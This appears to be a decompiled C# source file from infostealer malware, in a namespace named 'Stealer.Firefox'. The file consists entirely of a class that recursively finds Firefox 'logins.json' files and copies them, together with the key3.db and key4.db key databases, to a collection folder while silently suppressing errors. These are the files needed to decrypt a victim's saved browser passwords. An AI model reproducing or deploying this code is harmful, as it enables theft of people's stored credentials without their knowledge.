﻿using System;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x02000033 RID: 51
	internal sealed class cLogins
	{
		// Token: 0x060000D6 RID: 214 RVA: 0x00007178 File Offset: 0x00005378
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				if (File.Exists(from))
				{
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x000071BC File Offset: 0x000053BC
		public static void GetDBFiles(string path, string sSavePath)
		{
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files == null)
			{
				return;
			}
			foreach (string path2 in files)
			{
				foreach (string path3 in cLogins.keyFiles)
				{
					cLogins.CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(path2), path3), sSavePath);
				}
			}
		}

		// Token: 0x0400007C RID: 124
		private static string[] keyFiles = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json"
		};
	}
}
